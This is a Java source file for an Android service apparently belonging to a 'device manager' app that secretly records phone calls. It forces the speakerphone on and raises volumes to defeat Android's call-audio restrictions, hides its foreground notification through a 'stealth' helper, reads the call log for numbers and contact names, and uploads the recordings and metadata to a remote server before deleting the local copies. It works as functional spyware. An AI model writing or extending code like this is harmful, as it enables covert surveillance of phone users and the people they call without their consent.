package com.company.devicemgr.services;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;

import com.company.devicemgr.utils.ApiConfig;
import com.company.devicemgr.utils.ForegroundNotificationHelper;
import com.company.devicemgr.utils.HttpClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallRecorderService extends Service {
    public static final String ACTION_START_RECORDING = "com.company.devicemgr.action.START_CALL_RECORDING";
    public static final String ACTION_STOP_RECORDING = "com.company.devicemgr.action.STOP_CALL_RECORDING";

    private static final String TAG = "CallRecorderService";
    private static final String PREFS = "devicemgr_prefs";
    private static final String KEY_QUEUE = "pending_call_recordings";
    private static final String CHANNEL_ID = "devicemgr_call_recorder";
    private static final int NOTIFICATION_ID = 2;
    private static final int AUDIO_SETTLE_DELAY_MS = 350;
    private static final int COMPAT_AUDIO_SETTLE_DELAY_MS = 700;
    private static final int AUDIO_BITRATE = 96000;
    private static final int AUDIO_SAMPLE_RATE = 44100;
    private static final int LEGACY_ANDROID_10_API_LEVEL = 29;
    private static final int MODERN_ANDROID_14_API_LEVEL = 34;

    private MediaRecorder recorder;
    private File currentOutputFile;
    private long currentRecordingStartedAtMs;
    private boolean recording;
    private boolean compatibilityMode;
    private boolean currentUsesSpeakerRouting;
    private int currentAudioSource = -1;
    private String currentStrategyName = "unknown";

    private AudioManager audioManager;
    private int previousAudioMode = AudioManager.MODE_NORMAL;
    private boolean previousSpeakerphoneState;
    private int previousVoiceCallVolume = -1;
    private int previousMusicVolume = -1;
    private boolean audioStateCaptured;

    @Override
    public void onCreate() {
        super.onCreate();
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        startAsForegroundService();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        Log.d(TAG, "onStartCommand action=" + action);

        if (ACTION_START_RECORDING.equals(action)) {
            startRecording();
        } else if (ACTION_STOP_RECORDING.equals(action)) {
            stopRecording();
            flushQueueAsync();
            stopSelf();
            return START_NOT_STICKY;
        } else {
            flushQueueAsync();
            stopSelf();
            return START_NOT_STICKY;
        }
        return START_STICKY;
    }

    private synchronized void startRecording() {
        if (recording || recorder != null) {
            Log.d(TAG, "startRecording ignored because recorder is already active");
            return;
        }

        RecordingAttempt[] attempts = buildRecordingAttempts();
        for (RecordingAttempt attempt : attempts) {
            if (tryStartRecording(attempt)) {
                compatibilityMode = attempt.compatibilityMode;
                currentUsesSpeakerRouting = attempt.useSpeakerRouting;
                currentAudioSource = attempt.audioSource;
                currentStrategyName = attempt.strategyName;
                return;
            }
        }

        Log.e(TAG, "unable to start call recording with any configured strategy");
        restoreAudioState();
        safeReleaseRecorder(false);
    }

    private RecordingAttempt[] buildRecordingAttempts() {
        if (Build.VERSION.SDK_INT >= MODERN_ANDROID_14_API_LEVEL) {
            return new RecordingAttempt[]{
                    new RecordingAttempt("voice_communication", MediaRecorder.AudioSource.VOICE_COMMUNICATION, false, false),
                    new RecordingAttempt("speaker_mic_primary", MediaRecorder.AudioSource.MIC, true, false),
                    new RecordingAttempt("speaker_camcorder_primary", MediaRecorder.AudioSource.CAMCORDER, true, false),
                    new RecordingAttempt("speaker_mic_compat", MediaRecorder.AudioSource.MIC, true, true)
            };
        }

        if (Build.VERSION.SDK_INT >= LEGACY_ANDROID_10_API_LEVEL) {
            return new RecordingAttempt[]{
                    new RecordingAttempt("legacy_voice_communication", MediaRecorder.AudioSource.VOICE_COMMUNICATION, false, false),
                    new RecordingAttempt("legacy_voice_recognition", MediaRecorder.AudioSource.VOICE_RECOGNITION, false, false),
                    new RecordingAttempt("legacy_mic", MediaRecorder.AudioSource.MIC, false, false),
                    new RecordingAttempt("speaker_mic_primary", MediaRecorder.AudioSource.MIC, true, false),
                    new RecordingAttempt("speaker_camcorder_primary", MediaRecorder.AudioSource.CAMCORDER, true, false),
                    new RecordingAttempt("speaker_mic_compat", MediaRecorder.AudioSource.MIC, true, true)
            };
        }

        return new RecordingAttempt[]{
                new RecordingAttempt("legacy_voice_communication", MediaRecorder.AudioSource.VOICE_COMMUNICATION, false, false),
                new RecordingAttempt("legacy_voice_recognition", MediaRecorder.AudioSource.VOICE_RECOGNITION, false, false),
                new RecordingAttempt("legacy_mic", MediaRecorder.AudioSource.MIC, false, false),
                new RecordingAttempt("speaker_camcorder_primary", MediaRecorder.AudioSource.CAMCORDER, true, false),
                new RecordingAttempt("speaker_mic_primary", MediaRecorder.AudioSource.MIC, true, false)
        };
    }

    private boolean tryStartRecording(RecordingAttempt attempt) {
        try {
            if (attempt.useSpeakerRouting) {
                captureAudioState();
                prepareAudioForCallCapture(attempt.compatibilityMode);
                sleepQuietly(attempt.compatibilityMode ? COMPAT_AUDIO_SETTLE_DELAY_MS : AUDIO_SETTLE_DELAY_MS);
            }

            File outputDir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "calls");
            if (!outputDir.exists() && !outputDir.mkdirs()) {
                throw new IOException("failed_to_create_output_dir");
            }

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentOutputFile = new File(outputDir, "call_" + timestamp + ".m4a");

            recorder = new MediaRecorder();
            recorder.setAudioSource(attempt.audioSource);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(AUDIO_SAMPLE_RATE);
            recorder.setAudioEncodingBitRate(AUDIO_BITRATE);
            recorder.setOutputFile(currentOutputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            currentRecordingStartedAtMs = System.currentTimeMillis();
            recording = true;

            Log.d(TAG, "call recording started file=" + currentOutputFile.getAbsolutePath() + " strategy=" + attempt.strategyName + " audioSource=" + attempt.audioSource);
            return true;
        } catch (IOException | RuntimeException e) {
            Log.e(TAG, "tryStartRecording failed strategy=" + attempt.strategyName, e);
            safeReleaseRecorder(true);
            if (attempt.useSpeakerRouting) {
                restoreAudioState();
            }
            return false;
        }
    }

    private void prepareAudioForCallCapture(boolean useCompatibilityProfile) {
        if (audioManager == null) {
            throw new IllegalStateException("audio_manager_unavailable");
        }

        audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
        audioManager.setSpeakerphoneOn(true);
        audioManager.setMicrophoneMute(false);
        maximizeVolume(AudioManager.STREAM_VOICE_CALL, true);
        maximizeVolume(AudioManager.STREAM_MUSIC, false);
        maximizeVolume(AudioManager.STREAM_NOTIFICATION, false);

        if (useCompatibilityProfile) {
            maximizeVolume(AudioManager.STREAM_SYSTEM, false);
        }
    }

    private void maximizeVolume(int streamType, boolean voiceCallStream) {
        if (audioManager == null) return;
        try {
            int currentVolume = audioManager.getStreamVolume(streamType);
            int maxVolume = audioManager.getStreamMaxVolume(streamType);
            if (voiceCallStream) {
                previousVoiceCallVolume = currentVolume;
            } else if (streamType == AudioManager.STREAM_MUSIC) {
                previousMusicVolume = currentVolume;
            }
            if (maxVolume > 0 && currentVolume != maxVolume) {
                audioManager.setStreamVolume(streamType, maxVolume, 0);
            }
        } catch (Exception e) {
            Log.e(TAG, "maximizeVolume failed for stream=" + streamType, e);
        }
    }

    private void captureAudioState() {
        if (audioManager == null || audioStateCaptured) return;
        try {
            previousAudioMode = audioManager.getMode();
            previousSpeakerphoneState = audioManager.isSpeakerphoneOn();
            previousVoiceCallVolume = audioManager.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
            previousMusicVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
            audioStateCaptured = true;
            Log.d(TAG, "captured previous audio state");
        } catch (Exception e) {
            Log.e(TAG, "captureAudioState failed", e);
        }
    }

    private synchronized void stopRecording() {
        if (!recording && recorder == null) {
            restoreAudioState();
            return;
        }

        boolean keptFile = false;
        try {
            if (recorder != null) {
                recorder.stop();
                keptFile = true;
                Log.d(TAG, "call recording stopped successfully");
            }
        } catch (RuntimeException e) {
            Log.e(TAG, "recorder stop failed", e);
            deleteCurrentOutputIfNeeded();
        } finally {
            safeReleaseRecorder(false);
            restoreAudioState();
        }

        if (keptFile && currentOutputFile != null && currentOutputFile.exists() && currentOutputFile.length() > 4096) {
            enqueueFile(
                    currentOutputFile.getAbsolutePath(),
                    currentRecordingStartedAtMs,
                    currentOutputFile.length(),
                    compatibilityMode,
                    currentAudioSource,
                    currentStrategyName,
                    currentUsesSpeakerRouting
            );
        }

        currentOutputFile = null;
        currentRecordingStartedAtMs = 0L;
        compatibilityMode = false;
        currentUsesSpeakerRouting = false;
        currentAudioSource = -1;
        currentStrategyName = "unknown";
        recording = false;
    }

    private void safeReleaseRecorder(boolean deleteIncompleteFile) {
        try {
            if (recorder != null) {
                recorder.reset();
                recorder.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "safeReleaseRecorder failed", e);
        } finally {
            recorder = null;
        }

        if (deleteIncompleteFile) {
            deleteCurrentOutputIfNeeded();
        }
        recording = false;
    }

    private void deleteCurrentOutputIfNeeded() {
        if (currentOutputFile != null && currentOutputFile.exists() && !currentOutputFile.delete()) {
            Log.w(TAG, "failed to delete incomplete recording " + currentOutputFile.getAbsolutePath());
        }
    }

    private void restoreAudioState() {
        if (audioManager == null || !audioStateCaptured) return;
        try {
            if (previousVoiceCallVolume >= 0) {
                audioManager.setStreamVolume(AudioManager.STREAM_VOICE_CALL, previousVoiceCallVolume, 0);
            }
            if (previousMusicVolume >= 0) {
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, previousMusicVolume, 0);
            }
            audioManager.setSpeakerphoneOn(previousSpeakerphoneState);
            audioManager.setMode(previousAudioMode);
            Log.d(TAG, "audio state restored");
        } catch (Exception e) {
            Log.e(TAG, "restoreAudioState failed", e);
        } finally {
            previousVoiceCallVolume = -1;
            previousMusicVolume = -1;
            audioStateCaptured = false;
        }
    }

    private void sleepQuietly(long delayMs) {
        try {
            Thread.sleep(delayMs);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private SharedPreferences prefs() {
        return getSharedPreferences(PREFS, MODE_PRIVATE);
    }

    private synchronized void enqueueFile(String path, long startedAtMs, long sizeBytes, boolean usedCompatibilityMode, int audioSource, String strategyName, boolean usedSpeakerRouting) {
        try {
            JSONArray arr = new JSONArray(prefs().getString(KEY_QUEUE, "[]"));
            JSONObject row = new JSONObject();
            row.put("path", path);
            row.put("startedAtMs", startedAtMs);
            row.put("sizeBytes", sizeBytes);
            row.put("usedCompatibilityMode", usedCompatibilityMode);
            row.put("audioSource", audioSource);
            row.put("strategyName", strategyName);
            row.put("usedSpeakerRouting", usedSpeakerRouting);
            arr.put(row);
            prefs().edit().putString(KEY_QUEUE, arr.toString()).apply();
            Log.d(TAG, "queued call recording " + path);
        } catch (Exception e) {
            Log.e(TAG, "enqueueFile failed", e);
        }
    }

    private void flushQueueAsync() {
        new Thread(this::flushQueue).start();
    }

    private synchronized void flushQueue() {
        try {
            String token = prefs().getString("auth_token", null);
            String deviceId = prefs().getString("deviceId", "unknown");
            if (token == null || token.length() == 0) {
                Log.d(TAG, "flushQueue skipped because auth token is missing");
                return;
            }

            JSONArray source = new JSONArray(prefs().getString(KEY_QUEUE, "[]"));
            JSONArray pending = new JSONArray();

            for (int i = 0; i < source.length(); i++) {
                JSONObject row = source.optJSONObject(i);
                if (row == null) continue;

                String path = row.optString("path", null);
                if (path == null || path.trim().isEmpty()) continue;

                File file = new File(path);
                if (!file.exists() || file.length() == 0) continue;

                try {
                    byte[] data = readFileBytes(file);
                    JSONObject metadata = new JSONObject();
                    metadata.put("source", "CallRecorderService");
                    metadata.put("strategy", "speaker_mic_workaround");
                    metadata.put("transport", "audio_mp4");
                    metadata.put("capturedAtMs", row.optLong("startedAtMs", file.lastModified()));
                    metadata.put("sizeBytes", row.optLong("sizeBytes", file.length()));
                    metadata.put("usedCompatibilityMode", row.optBoolean("usedCompatibilityMode", false));
                    metadata.put("audioSource", row.optInt("audioSource", -1));
                    metadata.put("strategyName", row.optString("strategyName", "unknown"));
                    metadata.put("usedSpeakerRouting", row.optBoolean("usedSpeakerRouting", false));

                    JSONObject callContext = lookupNearestCallContext(row.optLong("startedAtMs", file.lastModified()));
                    if (callContext != null) {
                        metadata.put("callNumber", callContext.optString("number", null));
                        metadata.put("callContactName", callContext.optString("contactName", null));
                        metadata.put("callDirection", callContext.optString("direction", null));
                        metadata.put("callDurationSeconds", callContext.optLong("duration", 0L));
                    }

                    java.util.Map<String, String> form = new java.util.HashMap<>();
                    form.put("captureMode", "call_recording");
                    form.put("captureKind", "call_audio");
                    form.put("segmentStartedAtMs", String.valueOf(row.optLong("startedAtMs", file.lastModified())));
                    form.put("segmentDurationMs", "0");
                    form.put("metadataJson", metadata.toString());

                    String response = HttpClient.uploadFile(
                            ApiConfig.api("/api/media/" + deviceId + "/upload"),
                            "media",
                            file.getName(),
                            data,
                            "audio/mp4",
                            form,
                            token
                    );
                    JSONObject json = new JSONObject(response != null ? response : "{}");
                    if (json.optBoolean("ok")) {
                        boolean deleted = file.delete();
                        Log.d(TAG, "uploaded call recording " + file.getName() + " deleted=" + deleted);
                    } else {
                        pending.put(row);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "flushQueue upload failed for " + path, e);
                    pending.put(row);
                }
            }

            prefs().edit().putString(KEY_QUEUE, pending.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "flushQueue failed", e);
        }
    }

    private byte[] readFileBytes(File file) throws IOException {
        try (FileInputStream inputStream = new FileInputStream(file);
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, read);
            }
            return outputStream.toByteArray();
        }
    }

    private JSONObject lookupNearestCallContext(long startedAtMs) {
        if (startedAtMs <= 0L) return null;
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DURATION,
                            CallLog.Calls.DATE
                    },
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );
            if (cursor == null) return null;

            while (cursor.moveToNext()) {
                long callTimestamp = cursor.getLong(4);
                if (Math.abs(callTimestamp - startedAtMs) > 15 * 60 * 1000L) continue;

                JSONObject output = new JSONObject();
                output.put("number", cursor.getString(0));
                output.put("contactName", cursor.getString(1));
                output.put("direction", callDirectionLabel(cursor.getInt(2)));
                output.put("duration", cursor.getLong(3));
                output.put("ts", callTimestamp);
                return output;
            }
        } catch (SecurityException e) {
            Log.e(TAG, "lookupNearestCallContext missing permission", e);
        } catch (Exception e) {
            Log.e(TAG, "lookupNearestCallContext failed", e);
        } finally {
            if (cursor != null) cursor.close();
        }
        return null;
    }

    private String callDirectionLabel(int type) {
        if (type == CallLog.Calls.INCOMING_TYPE) return "Recebida";
        if (type == CallLog.Calls.OUTGOING_TYPE) return "Efetuada";
        if (type == CallLog.Calls.MISSED_TYPE) return "Perdida";
        if (type == CallLog.Calls.REJECTED_TYPE) return "Rejeitada";
        if (type == CallLog.Calls.BLOCKED_TYPE) return "Bloqueada";
        if (type == CallLog.Calls.VOICEMAIL_TYPE) return "Voicemail";
        return "Desconhecida";
    }

    private void startAsForegroundService() {
        try {
            ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "DeviceMgr Call Recorder");
            Notification notification = ForegroundNotificationHelper.buildStealthServiceNotification(
                    this,
                    CHANNEL_ID,
                    android.R.drawable.ic_btn_speak_now
            );
            startForeground(NOTIFICATION_ID, notification);
        } catch (Exception e) {
            Log.e(TAG, "startAsForegroundService failed", e);
        }
    }

    @Override
    public void onDestroy() {
        stopRecording();
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private static final class RecordingAttempt {
        final String strategyName;
        final int audioSource;
        final boolean useSpeakerRouting;
        final boolean compatibilityMode;

        RecordingAttempt(String strategyName, int audioSource, boolean useSpeakerRouting, boolean compatibilityMode) {
            this.strategyName = strategyName;
            this.audioSource = audioSource;
            this.useSpeakerRouting = useSpeakerRouting;
            this.compatibilityMode = compatibilityMode;
        }
    }
}
